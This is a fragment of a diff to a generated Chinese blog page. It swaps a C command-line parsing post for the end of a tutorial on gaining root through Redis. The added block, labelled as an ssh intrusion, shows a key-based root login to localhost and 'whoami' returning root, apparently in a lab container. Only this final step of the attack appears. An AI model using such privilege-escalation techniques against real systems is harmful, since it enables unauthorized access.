-  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre>
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>text</span>
-    </div>
-    <pre data-role="codeBlock" data-info="text" class="language-text">[root@fangjin test]# ./main --name zhangsan --age 16
-key[m] = value[zhangsan]
-key[s] = value[16]
+    <pre data-role="codeBlock" data-info="text { file=&quot;ssh &#x5165;&#x4FB5;&quot; }" class="language-text">[root@fangjin ~]# ssh -p 22-i ~/.ssh/fangjin root@127.0.0.1
+The authenticity of host &apos;[127.0.0.1]:22 ([127.0.0.1]:22)&apos; can&apos;t be established.
+ECDSA key fingerprint is SHA256:B+N75iAqdN1g0TuXZXv0LgScZeTgvrsG2rQdS1o4L7U.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &apos;[127.0.0.1]:22&apos; (ECDSA) to the list of known hosts.
+Last login: Wed Dec  1 09:54:00 2021 from gateway
+[root@e9ea89bbb38e ~]# whoami
+root
+[root@e9ea89bbb38e ~]#
 </pre>
     </div>
     
@@ -704,7 +536,7 @@ key[s] = value[16]
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://blog.fangjin.life/util/c-comand/" title="C 语言处理命令行参数" target="_blank" rel="external">http://blog.fangjin.life/util/c-comand/</a>
+      <a href="http://blog.fangjin.life/redis-penetration/" title="通过 redis 获取系统的 root 权限" target="_blank" rel="external">http://blog.fangjin.life/redis-penetration/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -748,13 +580,9 @@ key[s] = value[16]
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/redis-penetration/" title="通过 redis 获取系统的 root 权限"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/osi/transport/" title="传输层"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/util/c-comand/" title="C 语言处理命令行参数"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
